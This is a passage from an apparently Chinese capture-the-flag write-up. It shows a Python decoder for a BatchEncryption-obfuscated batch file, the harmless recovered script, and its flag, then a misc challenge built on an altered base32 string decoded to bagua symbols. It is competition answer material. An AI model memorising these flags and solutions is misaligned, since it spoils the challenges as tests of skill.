+<a id="__codelineno-2-64" name="__codelineno-2-64"></a><a href="#__codelineno-2-64"><span class="linenos" data-linenos=" 64 "></span></a>                <span class="k">if</span> <span class="p">(</span><span class="n">start</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">==</span> <span class="n">index</span><span class="p">)</span> <span class="ow">and</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mh">0x30</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mh">0x39</span><span class="p">)</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x2A</span><span class="p">):</span>
+<a id="__codelineno-2-65" name="__codelineno-2-65"></a><a href="#__codelineno-2-65"><span class="linenos" data-linenos=" 65 "></span></a>                    <span class="n">flag</span> <span class="o">=</span> <span class="kc">False</span>
+<a id="__codelineno-2-66" name="__codelineno-2-66"></a><a href="#__codelineno-2-66"><span class="linenos" data-linenos=" 66 "></span></a>                    <span class="n">ended</span> <span class="o">=</span> <span class="n">index</span>
+<a id="__codelineno-2-67" name="__codelineno-2-67"></a><a href="#__codelineno-2-67"><span class="linenos" data-linenos=" 67 "></span></a>                    <span class="n">buffer</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">start</span><span class="p">:</span> <span class="n">ended</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
+<a id="__codelineno-2-68" name="__codelineno-2-68"></a><a href="#__codelineno-2-68"><span class="linenos" data-linenos=" 68 "></span></a>                    <span class="n">source</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-69" name="__codelineno-2-69"></a><a href="#__codelineno-2-69"><span class="linenos" data-linenos=" 69 "></span></a>                <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+<a id="__codelineno-2-70" name="__codelineno-2-70"></a><a href="#__codelineno-2-70"><span class="linenos" data-linenos=" 70 "></span></a>        <span class="k">if</span> <span class="n">index</span> <span class="o">&gt;=</span> <span class="n">length</span><span class="p">:</span> <span class="k">break</span>
+<a id="__codelineno-2-71" name="__codelineno-2-71"></a><a href="#__codelineno-2-71"><span class="linenos" data-linenos=" 71 "></span></a>    <span class="nb">print</span><span class="p">(</span><span class="n">source</span><span class="p">)</span>
+<a id="__codelineno-2-72" name="__codelineno-2-72"></a><a href="#__codelineno-2-72"><span class="linenos" data-linenos=" 72 "></span></a>    <span class="n">bufs</span> <span class="o">=</span> <span class="n">source</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;&amp;@&#39;</span><span class="p">)</span> <span class="c1"># 解析加密变量</span>
+<a id="__codelineno-2-73" name="__codelineno-2-73"></a><a href="#__codelineno-2-73"><span class="linenos" data-linenos=" 73 "></span></a>    <span class="k">for</span> <span class="n">var</span> <span class="ow">in</span> <span class="n">bufs</span><span class="p">:</span>
+<a id="__codelineno-2-74" name="__codelineno-2-74"></a><a href="#__codelineno-2-74"><span class="linenos" data-linenos=" 74 "></span></a>        <span class="k">if</span> <span class="n">var</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;set &#39;</span><span class="p">:</span>
+<a id="__codelineno-2-75" name="__codelineno-2-75"></a><a href="#__codelineno-2-75"><span class="linenos" data-linenos=" 75 "></span></a>            <span class="n">var</span> <span class="o">=</span> <span class="n">var</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
+<a id="__codelineno-2-76" name="__codelineno-2-76"></a><a href="#__codelineno-2-76"><span class="linenos" data-linenos=" 76 "></span></a>            <span class="n">b</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
+<a id="__codelineno-2-77" name="__codelineno-2-77"></a><a href="#__codelineno-2-77"><span class="linenos" data-linenos=" 77 "></span></a>            <span class="n">envars</span><span class="p">[</span><span class="n">var</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">b</span><span class="p">]]</span> <span class="o">=</span> <span class="n">var</span><span class="p">[</span><span class="n">b</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;^^^&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="p">)</span>
+<a id="__codelineno-2-78" name="__codelineno-2-78"></a><a href="#__codelineno-2-78"><span class="linenos" data-linenos=" 78 "></span></a>    <span class="n">source</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+<a id="__codelineno-2-79" name="__codelineno-2-79"></a><a href="#__codelineno-2-79"><span class="linenos" data-linenos=" 79 "></span></a>    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;index&quot;</span><span class="p">:</span> <span class="n">index</span><span class="p">,</span> <span class="s2">&quot;source&quot;</span><span class="p">:</span> <span class="n">source</span><span class="p">}</span>
+<a id="__codelineno-2-80" name="__codelineno-2-80"></a><a href="#__codelineno-2-80"><span class="linenos" data-linenos=" 80 "></span></a>
+<a id="__codelineno-2-81" name="__codelineno-2-81"></a><a href="#__codelineno-2-81"><span class="linenos" data-linenos=" 81 "></span></a>
+<a id="__codelineno-2-82" name="__codelineno-2-82"></a><a href="#__codelineno-2-82"><span class="linenos" data-linenos=" 82 "></span></a><span class="k">def</span> <span class="nf">batchDecryp</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<a id="__codelineno-2-83" name="__codelineno-2-83"></a><a href="#__codelineno-2-83"><span class="linenos" data-linenos=" 83 "></span></a>    <span class="n">result</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">();</span> <span class="n">source</span> <span class="o">=</span> <span class="nb">str</span><span class="p">()</span>
+<a id="__codelineno-2-84" name="__codelineno-2-84"></a><a href="#__codelineno-2-84"><span class="linenos" data-linenos=" 84 "></span></a>
+<a id="__codelineno-2-85" name="__codelineno-2-85"></a><a href="#__codelineno-2-85"><span class="linenos" data-linenos=" 85 "></span></a>    <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-2-86" name="__codelineno-2-86"></a><a href="#__codelineno-2-86"><span class="linenos" data-linenos=" 86 "></span></a>    <span class="k">while</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">):</span>
+<a id="__codelineno-2-87" name="__codelineno-2-87"></a><a href="#__codelineno-2-87"><span class="linenos" data-linenos=" 87 "></span></a>        <span class="n">result</span> <span class="o">=</span> <span class="n">batchReader</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
+<a id="__codelineno-2-88" name="__codelineno-2-88"></a><a href="#__codelineno-2-88"><span class="linenos" data-linenos=" 88 "></span></a>        <span class="n">index</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;index&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-89" name="__codelineno-2-89"></a><a href="#__codelineno-2-89"><span class="linenos" data-linenos=" 89 "></span></a>        <span class="n">source</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;source&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-90" name="__codelineno-2-90"></a><a href="#__codelineno-2-90"><span class="linenos" data-linenos=" 90 "></span></a>    <span class="k">return</span> <span class="n">source</span>
+<a id="__codelineno-2-91" name="__codelineno-2-91"></a><a href="#__codelineno-2-91"><span class="linenos" data-linenos=" 91 "></span></a>
+<a id="__codelineno-2-92" name="__codelineno-2-92"></a><a href="#__codelineno-2-92"><span class="linenos" data-linenos=" 92 "></span></a>
+<a id="__codelineno-2-93" name="__codelineno-2-93"></a><a href="#__codelineno-2-93"><span class="linenos" data-linenos=" 93 "></span></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<a id="__codelineno-2-94" name="__codelineno-2-94"></a><a href="#__codelineno-2-94"><span class="linenos" data-linenos=" 94 "></span></a>    <span class="c1"># if len(sys.argv) &lt; 2:</span>
+<a id="__codelineno-2-95" name="__codelineno-2-95"></a><a href="#__codelineno-2-95"><span class="linenos" data-linenos=" 95 "></span></a>    <span class="c1">#     print(&quot;[x] Script parameter length error!&quot;)</span>
+<a id="__codelineno-2-96" name="__codelineno-2-96"></a><a href="#__codelineno-2-96"><span class="linenos" data-linenos=" 96 "></span></a>    <span class="c1">#     print(&quot;[!] Usage: python dencrypt.py encrypt.bat&quot;)</span>
+<a id="__codelineno-2-97" name="__codelineno-2-97"></a><a href="#__codelineno-2-97"><span class="linenos" data-linenos=" 97 "></span></a>    <span class="c1">#     exit(0)</span>
+<a id="__codelineno-2-98" name="__codelineno-2-98"></a><a href="#__codelineno-2-98"><span class="linenos" data-linenos=" 98 "></span></a>    <span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;forensics.bat&#39;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-99" name="__codelineno-2-99"></a><a href="#__codelineno-2-99"><span class="linenos" data-linenos=" 99 "></span></a>    <span class="n">data</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">();</span> <span class="n">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<a id="__codelineno-2-100" name="__codelineno-2-100"></a><a href="#__codelineno-2-100"><span class="linenos" data-linenos="100 "></span></a>    <span class="n">batchDecryp</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-2-101" name="__codelineno-2-101"></a><a href="#__codelineno-2-101"><span class="linenos" data-linenos="101 "></span></a>    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div>
+运行得到bat脚本
+<div class="language-bat highlight"><span class="filename">Batchfile</span><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><a href="#__codelineno-3-1"><span class="linenos" data-linenos="1 "></span></a><span class="p">@</span><span class="k">echo</span> on<span class="p">&amp;@</span><span class="k">endlocal</span><span class="p">&amp;@</span><span class="k">cls</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a><a href="#__codelineno-3-2"><span class="linenos" data-linenos="2 "></span></a><span class="p">@</span><span class="k">echo</span> off
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a><a href="#__codelineno-3-3"><span class="linenos" data-linenos="3 "></span></a><span class="k">echo</span> catf1y:your flag is already deleted by me.
+<a id="__codelineno-3-4" name="__codelineno-3-4"></a><a href="#__codelineno-3-4"><span class="linenos" data-linenos="4 "></span></a><span class="k">set</span> <span class="nv">find_me_pls </span><span class="p">=</span> b@TcH_O8FU$c@T1on_15_e@SY_70_SO1vE
+<a id="__codelineno-3-5" name="__codelineno-3-5"></a><a href="#__codelineno-3-5"><span class="linenos" data-linenos="5 "></span></a><span class="k">echo</span> crazyman:no no no no no no !!!!! i need flag.
+<a id="__codelineno-3-6" name="__codelineno-3-6"></a><a href="#__codelineno-3-6"><span class="linenos" data-linenos="6 "></span></a><span class="k">echo</span> Attention:can you help crazyman to find the flag?
+<a id="__codelineno-3-7" name="__codelineno-3-7"></a><a href="#__codelineno-3-7"><span class="linenos" data-linenos="7 "></span></a><span class="k">echo</span> Attention:Submit the info you are looking for on begin{*}
+</code></pre></div></p>
+<p>flag:  <code>begin{b@TcH_O8FU$c@T1on_15_e@SY_70_SO1vE}</code></p>
+<hr />
+<p>参考<a href="https://www.cnblogs.com/sakura--tears/p/17148303.html#B%40tCh">https://www.cnblogs.com/sakura--tears/p/17148303.html#B%40tCh</a>
+如果没有“::BatchEncryption Build 201610 By <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#103;&#119;&#115;&#98;&#104;&#113;&#116;&#64;&#49;&#54;&#51;&#46;&#99;&#111;&#109;">&#103;&#119;&#115;&#98;&#104;&#113;&#116;&#64;&#49;&#54;&#51;&#46;&#99;&#111;&#109;</a>”
+我都不知道从何下手，😭</p>
+<h2 id="misc">misc</h2>
+<h3 id="10">你知道中国文化嘛1.0</h3>
+<p>中国文化博大精深，</p>
+<h5 id="_5">解题过程</h5>
+<p>打开附件，
+得到一堆字符，是base编码</p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><a href="#__codelineno-4-1"><span class="linenos" data-linenos="1 "></span></a>4KMLHYUYWTRJRNPCTCZOFGFQ4KMLLYUYWLRJRNPCTC2OFGFT4KMLJYUYW3RJRMXCTC26FGFV4KMLFYUYWTRJRM7CTCZ6FGFU4KMLNYUYWLRJRMXCTC3OFGFS4KMLBYUYW7RJRM7CTC2OFGFW4KMLFYUYWPRJRMHCTCZOFGFR4KMLNYUYWPRJRNHCTC26FGFS4KMLBYUYWXRJRMXCTC26FGFU4KMLHYUYWTRJRNXCTCZOFGFV4KMLLYUYWLRJRNHCTCZ6FGFT4KMLJYUYWXRJRMXCTCZOFGFS4KMLFYUYWHRJRNHCTCZ6FGFV4KMLBYUYWLRJRNXCTCYOFGFS4KMLFYUYWDRJRM7CTC2OFGFV4KMLFYUYWDRJRNPCTCZOFGFV4KMLJYUYWPRJRNHCTC3OFGFS4KMLLYUYWXRJRMXCTC2OFGFT4KMLHYUYWTRJRNPCTCZOFGFX4KMLDYUYWLRJRNXCTCZ6FGFT4KMLJYUYW7RJRMXCTC26FGFV4KMLFYUYWHRJRMPCTCZ6FGFU4KMLNYUYWLRJRMXCTC3OFGFS4KMLBYUYW7RJRM7CTC2OFGFW4KMLFYUYWPRJRMHCTCZOFGFR4KMLNYUYWPRJRNHCTC26FGFS4KMLDYUYW7RJRMXCTCY6FGFT4KMLHYUYWTRJRNPCTCZOFGFS4KMLNYUYWLRJRMHCTC2OFGFT4KMLJYUYW3RJRMXCTC3OFGFT4KMLFYUYWLRJRNPCTCZ6FGFU4KMLNYUYWLRJRNXCTCZOFGFS4KMLPYUYWPRJRM7CTC2OFGFV4KMLFYUYWLRJRMXCTCZOFGFR4KMLJYUYWPRJRNPCTCYOFGFS4KMLNYUYWDRJRMXCTCZOFGFQ4KMLHYUYWTRJRNXCTCZOFGFW4KMLHYUYWLRJRMXCTC26FGFT4KMLJYUYW3RJRMXCTC3OFGFS4KMLFYUYW7RJRM7CTCZ6FGFU4KMLLYUYWLRJRMHCTC26FGFS4KMLLYUYWTRJRM7CTC2OFGFW4KMLFYUYWXRJRNPCTCZOFGFU4KMLHYUYWPRJRNHCTC3OFGFS4KMLFYUYW3RJRMXCTCYOFGFX4KMLHYUYWTRJRNXCTCZOFGFT4KMLBYUYWLRJRMPCTC3OFGFT4KMLJYUYWXRJRMXCTCYOFGFV4KMLFYUYWXRJRNHCTCZ6FGFU4KMLNYUYWLRJRNPCTC26FGF$4KMLJYUYWPRJRM7CTC2OFGFV4KMLFYUYW7RJRMPCTCZOFGFW4KMLHYUYWPRJRNHCTC36FGFS4KMLLYUYWXRJRMXCTCY6FGFR4KMLHYUYWTRJRNPCTCZOFGFQ4KMLLYUYWLRJRNPCTC2OFGFT4KMLJYUYW3RJRMXCTC26FGFV4KMLFYUYWTRJRM7CTCZ6FGFU4KMLLYUYWLRJRN7CTCY6FGFS4KMLNYUYWPRJRM7CTC2OFGFX4KMLFYUYWXRJRNPCTCZOFGFR4KMLDYUYWPRJRNHCTC26FGFS4KMLFYUYWLRJRMXCTCY6FGFU4KMLHYUYWXRJRMHCTCZOFGFW4KMLBYUYWLRJRMXCTCYOFGFT4KMLJYUYW7RJRMXCTCY6FGFQ4KMLFYUYW3RJRMPCTCZ6FGFU4KMLLYUYWLRJRM7CTCZ6FGFS4KMLPYUYWXRJRM7CTC2OFGFV4KMLFYUYWDRJRNPCTCZOFGFV4KMLJYUYWPRJRNHCTC3OFGFS4KMLLYUYWXRJRMXCTC2OFGFT4KMLHYUYWTRJRNPCTCZOFGFX4KMLDYUYWLRJRNXCTCZ6FGFT4KMLJYUYW7RJRMXCTC26FGFV4KMLFYUYWHRJRMPCTCZ6FGFU4KMLLYUYWLRJRMXCTCZOFGFS4KMLDYUYWTRJRM7CTC26FGFQ4KMLFYUYW3RJRMHCTCZOFGFS4KMLBYUYWPRJRNHCTC26FGFS4KMLFYUYWLRJRMXCTCY6FGFU4KMLHYUYWXRJRMHCTCZOFGFW4KMLBYUYWLRJRMXCTCYOFGFT4KMLJYUYWXRJRMXCTCYOFGFV4KMLFYUYWXRJRNHCTCZ6FGFU4KMLNYUYWLRJRNPCTC26FGFS4KMLJYUYWPRJRM7CTC26FGFQ4KMLFYUYWDRJRN&amp;CTCZOFGFV4KMLFYUYWPRJRNHCTC36FGFS4KMLFYUYWTRJRMXCTC3OFGFR4KMLHYUYWTRJRNPCTCZOFGFS4KMLFYUYWLRJRMPCTC2OFGFT4KMLLYUYWDRJRMXCTC3OFGFQ4KMLFYUYWLRJRMHCTCZ6FGFU4KMLPYUYWLRJRMPCTCYOFGFS4KMLNYUYWHRJRM7CTC2OFGFV4KMLFYUYWPRJRM7CTCZOFGFX4KMLLYUYWPRJRNHCTC26FGFS4KMLFYUYWLRJRMXCTCY6FGFU4KMLHYUYWXRJRMHCTCZOFGFW4KMLBYUYWLRJRMXCTCYOFGFT4KMLJYUYWXRJRMXCTC26FGFX4KMLFYUYWHRJRNHCTCZ6FGFU4KMLLYUYWLRJRN&amp;CTC2OFGFS4KMLPYUYWLRJRM7CTC2OFGFV4KMLFYUYWLRJRMXCTCZOFGFR4KMLJYUYWPRJRNPCTCYOFGFS4KMLNYUYWDRJRMXCTCZOFGFQ4KMLHYUYWTRJRN7CTCZOFGFR4KMLBYUYWLRJRNXCTCY6FGFT4KMLJYUYWXRJRMXCTCZ6FGFT4KMLFYUYW7RJRNPCTCZ6FGFU4KMLLYUYWLRJRMHCTC26FGFS4KMLLYUYWTRJRM7CTC2OFGFW4KMLFYUYWXRJRNPCTCZOFGFU4KMLHYUYWPRJRNHCTC26FGFS4KMLBYUYWXRJRMXCTC26FGFU4KMLHYUYWTRJRNXCTCZOFGFV4KMLLYUYWLRJRNHCTCZ6FGFT4KMLJYUYWXRJRMXCTCYOFGFV4KMLFYUYWXRJRNHCTCZ6FGFU4KMLNYUYWLRJRNPCTC26FGFS4KMLJYUYWPRJRM7CTC2OFGFV4KMLFYUYWLRJRMXCTCZOFGFR4KMLJYUYWPRJRNPCTCYOFGFS4KMLNYUYWDRJRMXCTCZOFGFQ4KMLHYUYWTRJRNPCTCZOFGFQ4KMLLYUYWLRJRNPCTC2OFGFT4KMLJYUYW3RJRMXCTC26FGFV4KMLFYUYWTRJRM7CTCZ6FGFU4KMLNYUYWLRJRNXCTCZ6FGFS4KMLFYUYWXRJRM7CTC2OFGFW4KMLFYUYW3RJRMXCTCZOFGFX4KMLHYUYWPRJRNHCTC26FGFS4KMLBYUYWXRJRMXCTC26FGFU4KMLHYUYWTRJRNXCTCZOFGFV4KMLLYUYWLRJRNHCTCZ6FGFT4KMLJYUYWXRJRMXCTC36FGFR4KMLFYUYW3RJRM7CTCZ6FGFU4KMLPYUYWLRJRNPCTC26FGFS4KMLDYUYWHRJRM7CTC2OFGFV4KMLFYUYWDRJRNPCTCZOFGFV4KMLJYUYWPRJRNHCTC3OFGFS4KMLLYUYWXRJRMXCTC2OFGFT4KMLHYUYWXRJRMHCTCZOFGFQ4KMLPYUYWLRJRNPCTCZOFGFT4KMLJYUYW7RJRMXCTCZOFGFU4KMLFYUYW3RJRMPCTCZ6FGFU4KMLNYUYWLRJRMXCTC3OFGFS4KMLBYUYW7RJRM7CTC2OFGFW4KMLFYUYWPRJRMHCTCZOFGFR4KMLNYUYWPRJRNPCTCYOFGFS4KMLLYUYW7RJRMXCTCZ6FGFS4KMLHYUYWTRJRNHCTCZOFGFX4KMLPYUYWLRJRNHCTCY6FGFT4KMLJYUYWXRJRMXCTCZOFGFS4KMLFYUYWHRJRNHCTCZ6FGFV4KMLBYUYWLRJRNXCTCYOFGFS4KMLFYUYWDRJRM7CTC2OFGFV4KMLFYUYWLRJRMXCTCZOFGFR4KMLJYUYWPRJRNPCTCYOFGFS4KMLNYUYWDRJRMXCTCZOFGFQ4KMLHYUYWTRJRNXCTCZOFGFS4KMLNYUYWLRJRMHCTC36FGFT4KMLJYUYW3RJRMXCTCZ6FGFQ4KMLFYUYWHRJRNXCTCZ6FGFU4KMLLYUYWLRJRMHCTC26FGFS4KMLLYUYWTRJRM7CTC2OFGFW4KMLFYUYWXRJRNPCTCZOFGFU4KMLHYUYWPRJRNHCTC26FGFS4KMLPYUYWHRJRMXCTC3OFGFT4KMLHYUYWTRJRN7CTCZOFGFV4KMLLYUYWLRJRMPCTCY6FGFT4KMLJYUYWXRJRMXCTCYOFGFV4KMLFYUYWXRJRNHCTCZ6FGFU4KMLNYUYWLRJRNPCTC26FGFS4KMLJYUYWPRJRM7CTC2OFGFV4KMLFYUYWDRJRNPCTCZOFGFV4KMLJYUYWPRJRNHCTC3OFGFS4KMLLYUYWXRJRMXCTC2OFGFT4KMLHYUYWTRJRNPCTCZOFGFS4KMLFYUYWLRJRMPCTC2OFGFT4KMLLYUYWDRJRMXCTC3OFGFQ4KMLFYUYWLRJRMHCTCZ6FGFU4KMLNYUYWLRJRMXCTC26FGFS4KMLLYUYWTRJRM7CTC2OFGFU4KMLFYUYW7RJRMHCTCZOFGFT4KMLFYUYWPRJRNHCTC26FGFS4KMLFYUYWLRJRMXCTCY6FGFU4KMLHYUYWXRJRMHCTCZOFGFW4KMLBYUYWLRJRMXCTCYOFGFT4KMLLYUYWDRJRMXCTCYOFGFX4KMLFYUYWXRJRMXCTCZ6FGFU4KMLPYUYWLRJRMXCTC2OFGFS4KMLNYUYWHRJRM7CTC2OFGFV4KMLFYUYWDRJRNPCTCZOFGFV4KMLJYUYWPRJRNHCTC3OFGFS4KMLLYUYWXRJRMXCTC2OFGFT4KMLHYUYWTRJRNPCTCZOFGFQ4KMLLYUYWLRJRNPCTC2OFGFT4KMLJYUYW3RJRMXCTC26FGFV4KMLFYUYWTRJRM7CTCZ6FGFU4KMLNYUYWLRJRNXCTCZ6FGFS4KMLFYUYWXRJRM7CTC2OFGFW4KMLFYUYW3RJRMXCTCZOFGFX4KMLHYUYWPRJRNHCTC26FGFS4KMLDYUYW7RJRMXCTCY6FGFT4KMLHYUYWTRJRNPCTCZOFGFS4KMLNYUYWLRJRMHCTC2OFGFT4KMLJYUYW3RJRMXCTC3OFGFT4KMLFYUYWLRJRNPCTCZ6FGFU4KMLNYUYWLRJRNXCTCZOFGFS4KMLPYUYWPRJRM7CTC2OFGFV4KMLFYUYWDRJRNPCTCZOFGFV4KMLJYUYWPRJRNHCTC3OFGFS4KMLLYUYWXRJRMXCTC2OFGFT4KMLHYUYWTRJRNXCTCZOFGFS4KMLLYUYWLRJRNPCTC2OFGFT4KMLJYUYWTRJRMXCTC36FGFQ4KMLFYUYWPRJRMXCTCZ6FGFU4KMLNYUYWLRJRNXCTCZ6FGFS4KMLFYUYWXRJRM7CTC2OFGFW4KMLFYUYW3RJRMXCTCZOFGFX4KMLHYUYWPRJRNHCTC26FGFS4KMLDYUYW7RJRMXCTCY6FGFT4KMLHYUYWTRJRNPCTCZOFGFS4KMLNYUYWLRJRMHCTC2OFGFT4KMLJYUYWXRJRMXCTC36FGFR4KMLFYUYW3RJRM7CTCZ6FGFU4KMLPYUYWLRJRNPCTC26FGFS4KMLDYUYWHRJRM7CTC2OFGFV4KMLFYUYWDRJRNPCTCZOFGFV4KMLJYUYWPRJRNHCTC3OFGFS4KMLLYUYWXRJRMXCTC2OFGFT4KMLHYUYWTRJRNXCTCZOFGFW4KMLBYUYWLRJRMXCTCY6FGFT4KMLJYUYWTRJRMXCTC36FGFQ4KMLFYUYW7RJRM7CTCZ6FGFU4KMLLYUYWLRJRMXCTCZOFGFS4KMLDYUYWTRJRM7CTC26FGFQ4KMLFYUYW3RJRMHCTCZOFGFS4KMLBYUYWPRJRNHCTC3OFGFS4KMLNYUYWPRJRMXCTCZOFGFV4KMLHYUYWTRJRNXCTCZOFGFW4KMLFYUYWLRJRN7CTCZ6FGFT4KMLJYUYW3RJRMXCTCZOFGFW4KMLFYUYWDRJRN7CTCZ6FGFU4KMLNYUYWLRJRM7CTCYOFGFS4KMLDYUYW3RJRM7CTC26FGFQ4KMLFYUYWXRJRN7CTCZOFGFT4KMLFYUYWPRJRNHCTC2OFGFS4KMLPYUYW7RJRMXCTC2OFGFR4KMLHYUYWTRJRNPCTCZOFGFS4KMLFYUYWLRJRMPCTC2OFGFT4KMLLYUYWDRJRMXCTC3OFGFQ4KMLFYUYWLRJRMHCTCZ6FGFU4KMLLYUYWLRJRMXCTCZOFGFS4KMLDYUYWTRJRM7CTC26FGFQ4KMLFYUYW3RJRMHCTCZOFGFS4KMLBYUYWPRJRNHCTC3OFGFS4KMLNYUYWDRJRMXCTCZOFGFR4KMLHYUYWTRJRNHCTCZOFGFX4KMLBYUYWLRJRN7CTCZ6FGFT4KMLJYUYWXRJRMXCTCZOFGFS4KMLFYUYWHRJRNHCTCZ6FGFV4KMLBYUYWLRJRNXCTCYOFGFS4KMLFYUYWDRJRM7CTC2OFGFX4KMLFYUYWHRJRMHCTCZOFGFW4KMLDYUYWPRJRNHCTC26FGFS4KMLHYUYWPRJRMXCTC36FGFV4KMLHYUYWTRJRNXCTCZOFGFS4KMLNYUYWLRJRMHCTC36FGFT4KMLJYUYW3RJRMXCTCZ6FGFQ4KMLFYUYWHRJRNXCTCZ6FGFV4KMLBYUYWLRJRNPCTC36FGFS4KMLHYUYWLRJRM7CTC2OFGFU4KMLFYUYW7RJRN7CTCZOFGFU4KMLDYUYWPRJRNHCTC26FGFS4KMLFYUYWLRJRMXCTCY6FGFU4KMLHYUYWXRJRMHCTCZOFGFW4KMLBYUYWLRJRMXCTCYOFGFT4KMLJYUYWXRJRMXCTCZOFGFS4KMLFYUYWHRJRNHCTCZ6FGFV4KMLBYUYWLRJRNXCTCYOFGFS4KMLFYUYWDRJRM7CTC2OFGFW4KMLFYUYW3RJRMHCTCZOFGFS4KMLDYUYWPRJRNHCTC2OFGFS4KMLPYUYWDRJRMXCTC36FGFT4KMLHYUYWTRJRNPCTCZOFGFS4KMLFYUYWLRJRMPCTC2OFGFT4KMLLYUYWDRJRMXCTC3OFGFQ4KMLFYUYWLRJRMHCTCZ6FGFU4KMLNYUYWLRJRMXCTC3OFGFS4KMLBYUYW7RJRM7CTC2OFGFW4KMLFYUYWPRJRMHCTCZOFGFR4KMLNYUYWPRJRNHCTC26FGFS4KMLBYUYWXRJRMXCTC26FGFU4KMLHYUYWTRJRNXCTCZOFGFV4KMLLYUYWLRJRNHCTCZ6FGFT4KMLJYUYWXRJRMXCTCY6FGFX4KMLFYUYWHRJRM7CTCZ6FGFU4KMLLYUYWLRJRMXCTC3OFGFS4KMLBYUYWTRJRM7CTC2OFGFX4KMLFYUYWHRJRMHCTCZOFGFW4KMLDYUYWPRJRNHCTC26FGFS4KMLHYUYWPRJRMXCTC36FGFV4KMLHYUYWTRJRNPCTCZOFGFS4KMLFYUYWLRJRMPCTC@OFGFT4KMLLYUYWDRJRMXCTC3OFGFQ4KMLFYUYWLRJRMHCTCZ6FGFU4KMLPYUYWLRJRMPCTCYOFGFS4KMLNYUYWHRJRM7CTC2OFGFV4KMLFYUYWPRJRM7CTCZOFGFX4KMLLYUYWPRJRNHCTC26FGFS4KMLFYUYWLRJRMXCTCY6FGFU4KMLHYUYWXRJRMHCTCZOFGFW4KMLBYUYWLRJRMXCTCYOFGFT4KMLJYUYW3RJRMXCTC3OFGFQ4KMLFYUYWLRJRMPCTCZ6FGFU4KMLJYUYWLRJRN7CTCYOFGFS4KMLPYUYWPRJRM7CTC2OFGFV4KMLFYUYWDRJRNPCTCZOFGFV4KMLJYUYWPRJRNHCTC3OFGFS4KMLLYUYWXRJRMXCTC2OFGFT4KMLHYUYWTRJRNPCTCZOFGFS4KMLFYUYWLRJRMPCTC2OFGFT4KMLLYUYWDRJRMXCTC3OFGFQ4KMLFYUYWLRJRMHCTCZ6FGFU4KMLLYUYWLRJRMHCTC26FGFS4KMLLYUYWTRJRM7CTC@OFGFW4KMLFYUYWXRJRNPCTCZOFGFU4KMLHYUYWPRJRNHCTC26FGFS4KMLPYUYWHRJRMXCTC3OFGFT4KMLHYUYWTRJRN7CTCZOFGFV4KMLLYUYWLRJRMPCTCYQ====
+</code></pre></div>
+<p>不是常见的base64，是base32
+解码base32出错，有字符被替换为特殊字符@$&amp;</p>
+<p>复制前面的字符进行base32解码，是八卦字符加密</p>
+<p>💡编写python将特殊字符替换一下，解码base32，并解密八卦字符</p>
+<h6 id="_6">解题脚本</h6>
+<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><a href="#__codelineno-5-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="kn">import</span> <span class="nn">subprocess</span>
